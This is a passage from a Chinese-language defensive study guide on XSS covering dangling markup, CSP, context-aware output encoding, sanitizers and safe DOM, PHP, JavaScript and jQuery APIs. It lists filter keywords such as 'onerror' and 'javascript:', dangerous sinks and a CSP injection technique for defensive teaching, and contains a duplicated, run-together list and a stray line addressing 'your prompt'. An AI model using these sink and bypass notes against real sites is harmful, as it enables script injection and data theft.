| XSS     | 执行 JavaScript       |
| 悬空标记注入  | 利用 HTML 解析泄露后续页面内容  |
| HTML 注入 | 修改页面结构，不一定执行脚本或泄露数据 |

### 9.3 悬空标记注入的防护

防护重点仍然是 XSS 的通用防护：**按上下文输出编码，避免攻击者破坏 HTML 结构。**

此外，CSP 可以作为缓解措施。例如限制图片只能从同源加载：

```
Content-Security-Policy: img-src 'self'
```

这可以阻止部分基于 `img` 外带数据的悬空标记攻击。但它不是完整修复，因为其他标签、用户交互、浏览器差异仍可能影响结果。PortSwigger 原始资料也说明，CSP 可以缓解一些悬空标记攻击，但不是所有情况；Chrome 也对包含尖括号、换行符等原始字符的 URL 做过缓解处理。

结论：

```
输出编码是根本修复。CSP 和浏览器缓解是降低可利用性的辅助措施。
```

----

## 10. CSP与浏览器侧缓解

CSP（Content Security Policy，内容安全策略）是一种浏览器安全机制，用于限制页面可加载资源、可执行脚本以及页面能否被其他页面嵌入。它常用于缓解 XSS、数据外带、点击劫持等风险。PortSwigger 原始资料中也说明，CSP 通过限制脚本、图片等资源加载，以及限制页面嵌入来缓解相关攻击。

CSP 通过 HTTP 响应头启用：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
```

### 10.1 CSP 缓解 XSS 的方式

CSP 对 XSS 的主要缓解点是限制脚本执行来源和内联脚本执行。

常见策略：

```
script-src 'self'
```

表示只允许加载同源脚本。

如果需要允许特定外部脚本，可以指定可信源：

```
script-src 'self' https://scripts.example.com
```

但白名单必须谨慎。只要白名单域名允许用户上传或托管脚本，攻击者就可能借助该可信域加载恶意代码。

更稳的方式是使用 nonce 或 hash。

#### nonce

```html
<script nonce="random-value">...</script>
```

响应头中也声明对应 nonce。只有带正确 nonce 的脚本才能执行。

```
Content-Security-Policy: script-src 'nonce-random-value'
```

nonce 必须每次响应安全随机生成，不能固定，不能被攻击者预测。

#### hash

hash 策略允许执行内容哈希匹配的内联脚本。脚本内容一旦变化，hash 也要更新。

适合固定内联脚本，不适合动态拼接脚本。

PortSwigger 原始资料也提到，CSP 可通过指定可信域、nonce 或 hash 控制脚本执行；nonce 必须由服务端安全生成，攻击者无法猜测时才有效。

### 10.2 CSP 缓解数据外带

CSP 不只限制脚本，也能限制图片、连接、表单等资源请求。

常见指令：

| 指令                | 作用                           |
| ----------------- | ---------------------------- |
| `img-src`         | 控制图片加载来源                     |
| `connect-src`     | 控制 `fetch`、XHR、WebSocket 等连接 |
| `form-action`     | 控制表单提交目标                     |
| `frame-src`       | 控制页面可加载哪些 frame              |
| `base-uri`        | 控制 `<base>` 标签来源             |
| `object-src`      | 控制插件类资源                      |
| `frame-ancestors` | 控制哪些页面可以嵌入当前页面               |

XSS 成功后，攻击者不一定只靠脚本加载外部资源。图片请求、表单提交、连接请求都可能成为数据外带路径。因此 CSP 需要整体设计，而不是只写一个 `script-src`。

例如：

```http
default-src 'self';
script-src 'self';
img-src 'self';
connect-src 'self';
form-action 'self';
object-src 'none';
base-uri 'none';
```

这类策略会明显压缩 XSS 成功后的利用空间。

### 10.3 CSP 的局限性

CSP 是纵深防御，不是 XSS 修复本身。常见局限包括：

| 问题         | 说明                                           |
| ---------- | -------------------------------------------- |
| 策略过宽       | `unsafe-inline`、`unsafe-eval` 会显著削弱效果        |
| 白名单不可信     | 允许用户可控 CDN 或上传域，可能被借用                        |
| 只限制脚本不限制外带 | `img-src`、`connect-src`、`form-action` 过宽仍有风险 |
| 兼容性差异      | 不同浏览器和历史版本执行细节不同                             |
| 策略可被注入     | 如果用户输入进入 CSP 头，可能导致策略注入                      |
| 不能修复错误输出   | 根因仍然是上下文处理错误                                 |

所以正确关系是：

```
输出编码 / 安全 DOM API / 模板安全 = 主防线CSP = 降低利用成功率和影响面的纵深防御
```

不能反过来。用 CSP 掩盖 XSS 输出错误，是偷懒方案，迟早会炸。

### 10.4 CSP 绕过与策略注入

CSP 绕过通常不是“CSP 没用”，而是策略设计或策略生成方式存在问题。

常见问题：

```
允许 unsafe-inline
允许 unsafe-eval
白名单域名可被攻击者控制
CSP 头中反射了用户输入
script-src 与 script-src-elem 等指令关系处理不当
```

如果应用把用户输入反射进 CSP 头，例如反射进 `report-uri` 或其他指令附近，攻击者可能通过插入分号等方式影响策略结构。PortSwigger 原始资料也提到，CSP 中可控参数可能造成策略注入，并涉及 `script-src-elem` 覆盖既有 `script-src` 的场景。

记住判断模型：

```
CSP 是否有效，取决于策略内容、策略生成方式、白名单可信度、浏览器实现和页面实际脚本结构。
```

### 10.5 `frame-ancestors` 与点击劫持

CSP 还可以通过 `frame-ancestors` 防止页面被恶意站点嵌入，从而缓解点击劫持。

示例：

```
Content-Security-Policy: frame-ancestors 'self'
```

表示只允许同源页面嵌入当前页面。

完全禁止嵌入：

```
Content-Security-Policy: frame-ancestors 'none'
```

相比旧的 `X-Frame-Options`，`frame-ancestors` 更灵活，可以配置多个来源和通配范围。  

---

## 11. 防护原则

XSS 防护的核心不是“过滤危险字符”，而是建立稳定的数据边界：

```
不可信数据永远是数据
不能被浏览器、JavaScript 引擎或模板引擎解释为代码
```

你的提示词要求防护原则必须覆盖上下文、关键机制和风险边界，不能堆规则清单；XSS 这里尤其要按上下文处理，否则容易写成“转义一下就行”的低质量笔记。

### 11.1 按上下文输出编码

输出编码是 XSS 防护的主防线。编码必须发生在数据进入页面上下文之前，并且必须和上下文匹配。

| 输出位置           | 防护方式                                 |
| -------------- | ------------------------------------ |
| HTML 标签之间      | HTML 实体编码 `<`、`>`、`&`                |
| HTML 属性值       | 编码引号、尖括号、`&`，属性值始终加引号                |
| JavaScript 字符串 | JavaScript 字符串编码或安全 JSON 序列化         |
| URL 属性         | 协议白名单 + URL 编码                       |
| CSS 上下文        | 尽量避免插入不可信数据，必要时严格白名单                 |
| 客户端模板          | 不让输入成为模板源码或表达式                       |
| DOM 插入         | 优先使用 `textContent`、`.text()` 等文本 API |

错误做法是“一套编码打天下”。  

例如 HTML 编码对普通 HTML 文本有效，但不能直接解决 JavaScript 字符串、URL 协议、AngularJS 模板表达式或 DOM sink 问题。

### 11.2 输入验证

输入验证是辅助防线，适合限制数据格式和业务范围。

推荐白名单：

```
用户名：只允许字母、数字、下划线，长度 3-20
颜色：只允许固定枚举或合法 hex
跳转地址：只允许站内相对路径
手机号：只允许数字和固定长度
```

不推荐依赖黑名单：

```
过滤 script
过滤 alert
过滤 onerror
过滤 javascript:
```

黑名单的问题是无法覆盖浏览器解析差异、编码变体、上下文变化、框架表达式和 DOM sink 行为。  

输入验证可以减少攻击面，但不能替代输出编码。

### 11.3 安全处理富文本 HTML

如果业务允许用户提交富文本，不能简单原样输出，也不能用正则删除 `<script>`。

正确做法是使用成熟的 HTML Sanitizer，对标签、属性、协议做白名单处理，例如：

```
允许标签：p, br, strong, em, ul, li, a
允许属性：href, title
允许协议：https, mailto
禁止属性：onclick, onerror, style 等高风险属性
禁止协议：javascript:, data: 等危险协议
```

工程上常见方案是使用 DOMPurify 等成熟库，并保持更新。  

富文本安全的难点在于 HTML、SVG、MathML、URL、CSS、浏览器兼容行为会互相影响，自己手写过滤器很容易漏。

防护原则：

```
只允许业务需要的最小 HTML 子集。
默认拒绝事件属性和危险协议。
Sanitizer 需要持续更新。
```

### 11.4 模板引擎防护

现代模板引擎通常默认提供自动转义，但这不代表模板层天然安全。

常见危险用法：

```
关闭自动转义
使用 raw / safe 输出用户输入
把用户输入拼进 <script>
把用户输入拼进事件属性
把用户输入作为模板源码再次渲染
把用户输入拼进 href 但不校验协议关闭自动转义
使用 raw / safe 输出用户输入
把用户输入拼进 <script>
把用户输入拼进事件属性
把用户输入作为模板源码再次渲染
把用户输入拼进 href 但不校验协议
```

模板引擎的安全边界是：它能帮助你处理普通 HTML 输出，但不能自动理解所有 JavaScript、URL、CSS、客户端模板上下文。

特别注意：

```
不要把用户输入拼接成模板字符串后再编译。
不要把用户输入当模板表达式执行。
```

这点同时适用于 SSTI 和客户端模板注入。只不过 SSTI 发生在服务端模板，客户端模板注入发生在浏览器端框架。

### 11.5 DOM 安全 API

前端防护重点是避免把不可信数据送进危险 sink。

推荐写法：

```
element.textContent = userInput;
```

不推荐：

```
element.innerHTML = userInput;
```

jQuery 中推荐：

```
$("#msg").text(userInput);
```

不推荐：

```
$("#msg").html(userInput);
```

如果必须插入 HTML，应该先通过可靠 Sanitizer 清洗，再写入 DOM。

常见安全替代关系：

| 高风险写法                       | 更安全写法                     |
| --------------------------- | ------------------------- |
| `innerHTML = userInput`     | `textContent = userInput` |
| `document.write(userInput)` | 创建元素并设置文本                 |
| `setTimeout(userInput)`     | 传入函数引用                    |
| `eval(userInput)`           | 避免动态执行                    |
| `$(el).html(userInput)`     | `$(el).text(userInput)`   |
| `attr("href", userInput)`   | 协议白名单后再赋值                 |

前端代码里最容易出现的问题是：后端已经安全输出 JSON，但前端又把字段用 `innerHTML` 渲染了一遍。  

### 11.6 PHP 中的防护

在 PHP 的 HTML 上下文中，可以使用 `htmlentities()` 或 `htmlspecialchars()` 对输出进行编码。原始资料中给出了 `htmlentities($input, ENT_QUOTES, 'UTF-8')` 这类写法，用于 HTML 上下文输出。

示例：

```php
<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8'); ?>
```

注意边界：

```
适合 HTML 文本或多数 HTML 属性输出。
不等于适合 JavaScript 字符串、URL、CSS 或模板表达式。
```

如果要把数据输出进 JavaScript，优先使用安全 JSON 序列化，而不是手写字符串拼接：

```html
<script>
const name = <?php echo json_encode($name, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
</script>
```

这个思路比手写替换更稳定。

### 11.7 JavaScript 中的防护

JavaScript 防护重点是：

```
不要把不可信数据当 HTML。
不要把不可信数据当代码。
不要把不可信 URL 直接写入可触发属性。
```

安全文本输出：

```
node.textContent = userInput;
```

安全创建属性时，先判断业务含义：

```js
const url = new URL(userInput, location.origin);

if (url.origin === location.origin) {
    link.href = url.pathname + url.search + url.hash;
}
```

这个样例说明的是协议和源校验思路，不是完整通用库。真实项目中应根据业务定义允许范围，例如只允许相对路径、固定路由或可信域名。

### 11.8 jQuery 中的防护

jQuery 项目中常见问题来自 `.html()`、`.append()`、`.attr()`、`$()` 选择器等。

纯文本输出：

```
$("#content").text(userInput);
```

避免：

```
$("#content").html(userInput);
```

设置链接时：

```
$("#back").attr("href", safeRelativePath);
```

前提是 `safeRelativePath` 已经通过白名单校验。  

不能直接把 `location.search`、`location.hash`、接口返回值写入 `href` 或 `.html()`。

### 11.9 Cookie 安全属性与 XSS 的关系

Cookie 安全属性不能修复 XSS，但可以降低 XSS 成功后的部分影响。

| 属性         | 作用                        |
| ---------- | ------------------------- |
| `HttpOnly` | 防止 JavaScript 直接读取 Cookie |
| `Secure`   | 只通过 HTTPS 传输              |
| `SameSite` | 降低跨站请求携带 Cookie 的风险       |

注意：

```
HttpOnly 只能防止直接读取 Cookie。
它不能阻止 XSS 在当前浏览器会话中代替用户发起同源请求。
```

所以 Cookie 安全属性是必要的纵深防御，但不是 XSS 的修复措施。

### 11.10 CSP 作为纵深防御

推荐基础 CSP 思路：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'self';
  form-action 'self';
```

如果项目复杂，可以逐步引入：

```
nonce / hash 控制脚本
connect-src 限制接口连接
img-src 限制图片来源
report-uri 或 report-to 收集违规报告
```

但不要用 CSP 替代输出编码。  

CSP 是安全网，不是地板。你不能一边地板塌了，一边说“没事我挂了张网”。这个方案不稳。

---

## 12. 常见成因归纳

XSS 常见成因可以归纳成几类：

| 成因              | 说明                                    |
| --------------- | ------------------------------------- |
| 服务端模板直接拼接输入     | 反射型、存储型常见                             |
| 输出编码缺失或上下文错误    | HTML 编码被误用到 JS、URL、模板上下文              |
| 前端使用危险 DOM sink | `innerHTML`、`document.write`、`eval` 等 |
| 富文本清洗不完整        | 标签、属性、协议白名单不严                         |
| URL 协议未校验       | `href`、跳转参数、返回链接风险                    |
| 前端框架模板误用        | 客户端模板注入、AngularJS 表达式执行               |
| 过度依赖黑名单         | 无法覆盖编码变体和解析差异                         |
| CSP 配置过宽        | `unsafe-inline`、不可信白名单、外带路径未限制        |

核心判断：

```
XSS 不是输入点漏洞，而是输入点、输出点、解析上下文和安全处理共同决定的漏洞。
```
